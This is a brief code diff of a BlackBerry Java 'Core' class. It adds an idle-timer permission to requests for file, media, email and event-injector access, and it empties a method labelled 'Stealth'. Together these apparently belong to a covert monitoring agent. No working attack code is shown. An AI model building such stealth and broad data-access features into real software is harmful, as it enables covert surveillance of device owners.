@@ -9,10 +9,13 @@
 
 package blackberry;
 
+import java.util.Date;
+
 import net.rim.device.api.applicationcontrol.ApplicationPermissions;
 import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
 import net.rim.device.api.system.Application;
 import net.rim.device.api.system.ApplicationDescriptor;
+import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.crypto.Encryption;
 import blackberry.utils.Debug;
@@ -153,7 +156,8 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_FILE_API,
                 ApplicationPermissions.PERMISSION_MEDIA,
                 ApplicationPermissions.PERMISSION_EMAIL,
-                ApplicationPermissions.PERMISSION_EVENT_INJECTOR
+                ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
+                ApplicationPermissions.PERMISSION_IDLE_TIMER
                 };
 
         //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
@@ -274,7 +278,6 @@ public final class Core implements Runnable {
      * Stealth.
      */
     private void stealth() {
-        UiApplication app = UiApplication.getUiApplication();
         
     }
 
